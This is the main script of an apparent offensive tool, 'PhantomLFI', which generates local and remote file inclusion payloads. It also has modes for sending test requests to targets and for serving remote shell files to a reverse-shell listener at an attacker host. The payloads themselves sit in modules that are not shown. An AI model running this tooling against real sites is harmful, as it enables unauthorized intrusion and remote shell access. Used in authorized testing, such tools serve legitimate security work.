#!/usr/bin/env python3
"""
PhantomLFI — LFI / RFI Payload Generation Framework
Done by D4rk0ps
"""

import argparse
import sys
import os
from datetime import datetime

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

from core.generator import PayloadGenerator
from core.utils import banner, print_colored, write_output


def parse_arguments():
    """Parse and validate command-line arguments."""
    parser = argparse.ArgumentParser(
        prog="PhantomLFI",
        description="PhantomLFI — LFI / RFI Payload Generation Framework | Done by D4rk0ps",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument(
        "--url",
        required=True,
        help="Base URL with injectable parameter (e.g., http://target.com/page.php?file=)",
    )

    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("--test", action="store_true", help="Test if target is vulnerable (sends requests)")
    mode_group.add_argument("--serve", action="store_true", help="Start RFI payload server with shell files")
    mode_group.add_argument("--lfi", action="store_true", help="Generate LFI payloads")
    mode_group.add_argument("--rfi", action="store_true", help="Generate RFI payloads")
    mode_group.add_argument("--all", action="store_true", help="Generate LFI + RFI payloads")

    parser.add_argument(
        "--depth", type=int, default=6, choices=range(1, 11),
        metavar="[1-10]", help="Traversal depth (default: 6)",
    )
    parser.add_argument(
        "--attacker-host", default="ATTACKER_IP",
        help="Attacker IP/hostname for RFI payloads (default: ATTACKER_IP)",
    )
    parser.add_argument("-o", "--output", help="Save output to file")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
    parser.add_argument(
        "--timeout", type=int, default=10,
        help="Request timeout for --test mode (default: 10)",
    )
    parser.add_argument(
        "--port", type=int, default=80,
        help="HTTP server port for --serve mode (default: 80)",
    )
    parser.add_argument(
        "--rev-port", type=int, default=4444,
        help="Reverse shell port for --serve mode (default: 4444)",
    )

    return parser.parse_args()


def main():
    """Main entry point."""
    args = parse_arguments()
    use_color = COLORAMA_AVAILABLE and not args.no_color

    banner(use_color)

    # --- Test Mode ---
    if args.test:
        from core.tester import run_test
        run_test(
            base_url=args.url,
            use_color=use_color,
            timeout=args.timeout,
        )
        return

    # --- Serve Mode ---
    if args.serve:
        if args.attacker_host == "ATTACKER_IP":
            print_colored("\n  [!] --attacker-host is required for --serve mode", "red", use_color)
            print_colored("      Example: --attacker-host 10.10.14.5\n", "white", use_color)
            sys.exit(1)

        from core.server import run_serve
        run_serve(
            base_url=args.url,
            attacker_host=args.attacker_host,
            port=args.port,
            rev_port=args.rev_port,
            use_color=use_color,
        )
        return

    # --- Generation Mode ---
    generator = PayloadGenerator(
        base_url=args.url,
        depth=args.depth,
        attacker_host=args.attacker_host,
    )

    all_payloads = []
    output_lines = []

    header = [
        "",
        f"  Target URL    : {args.url}",
        f"  Mode          : {'LFI' if args.lfi else 'RFI' if args.rfi else 'ALL'}",
        f"  Depth         : {args.depth}",
        f"  Attacker Host : {args.attacker_host}",
        f"  Timestamp     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        "",
    ]

    for line in header:
        print_colored(line, "cyan", use_color)
        output_lines.append(line)

    # --- LFI ---
    if args.lfi or args.all:
        lfi_sections = generator.generate_lfi()
        for section_name, payloads in lfi_sections.items():
            section_header = f"\n{'='*70}\n  [LFI] {section_name}\n{'='*70}"
            print_colored(section_header, "yellow", use_color)
            output_lines.append(section_header)

            for payload in payloads:
                print_colored(f"  {payload}", "green", use_color)
                output_lines.append(f"  {payload}")
                all_payloads.append(payload)

            count_line = f"\n  >> {len(payloads)} payloads generated"
            print_colored(count_line, "magenta", use_color)
            output_lines.append(count_line)

    # --- RFI ---
    if args.rfi or args.all:
        rfi_sections = generator.generate_rfi()
        for section_name, payloads in rfi_sections.items():
            section_header = f"\n{'='*70}\n  [RFI] {section_name}\n{'='*70}"
            print_colored(section_header, "yellow", use_color)
            output_lines.append(section_header)

            for payload in payloads:
                print_colored(f"  {payload}", "red", use_color)
                output_lines.append(f"  {payload}")
                all_payloads.append(payload)

            count_line = f"\n  >> {len(payloads)} payloads generated"
            print_colored(count_line, "magenta", use_color)
            output_lines.append(count_line)

    # --- Summary ---
    summary = [
        "",
        "=" * 70,
        f"  TOTAL PAYLOADS GENERATED: {len(all_payloads)}",
        "=" * 70,
        "",
    ]
    for line in summary:
        print_colored(line, "cyan", use_color)
        output_lines.append(line)

    if args.output:
        write_output(args.output, output_lines)
        print_colored(f"  [+] Results saved to: {args.output}", "green", use_color)


if __name__ == "__main__":
    main()
